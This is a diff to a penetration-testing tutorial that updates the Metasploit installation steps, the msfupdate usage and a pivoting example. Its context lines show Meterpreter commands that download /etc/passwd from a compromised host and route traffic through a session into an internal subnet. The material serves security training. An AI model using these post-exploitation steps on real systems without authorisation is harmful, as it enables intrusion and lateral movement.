@@ -27,11 +27,14 @@ sudo /tmp/msfinstall
 # and adds wrapper scripts to /usr/local/bin/
 which msfconsole
 
-# Method 2: From Kali/Parrot repositories on Ubuntu (alternative)
-# This method is useful if you are running Ubuntu and want apt management
-wget -q https://apt.metasploit.com/metasploit-framework.gpg.key -O- \
-  | sudo apt-key add -
-echo "deb https://apt.metasploit.com/ xenial main" \
+# Method 2: From Rapid7's APT repository (alternative)
+# This method is useful if you are running Ubuntu and want apt management.
+# Note: the repository only publishes the "xenial" suite, which is used
+# regardless of your Ubuntu version.
+sudo install -d -m 0755 /etc/apt/keyrings
+wget -qO- https://apt.metasploit.com/metasploit-framework.gpg.key \
+  | sudo gpg --dearmor -o /etc/apt/keyrings/metasploit.gpg
+echo "deb [signed-by=/etc/apt/keyrings/metasploit.gpg] https://apt.metasploit.com/ xenial main" \
   | sudo tee /etc/apt/sources.list.d/metasploit.list
 sudo apt update
 sudo apt install metasploit-framework
@@ -53,9 +56,8 @@ msfconsole
 msf6 > db_status
 # Expected: [*] Connected to msf. Connection type: postgresql.
 
-# Update Metasploit to latest modules
-msf6 > msfupdate
-# Or from the shell:
+# Update Metasploit to latest modules (msfupdate is a shell command,
+# not an msfconsole command — run it from your shell):
 sudo /opt/metasploit-framework/bin/msfupdate
 ```
 
@@ -203,9 +205,9 @@ meterpreter > download /etc/passwd /tmp/
 meterpreter > upload /tmp/file.txt /tmp/
 
 # Pivoting to other networks
-meterpreter > run post/multi/manage/shell_to_meterpreter
+meterpreter > run post/multi/manage/autoroute SUBNET=10.0.0.0 NETMASK=255.255.255.0
 meterpreter > background  # Background the session
-msf6 > route add 10.0.0.0 255.255.255.0 1  # Route through session 1
+msf6 > route add 10.0.0.0 255.255.255.0 1  # Or add the route manually through session 1
 ```
 
 ## Generating Payloads with msfvenom
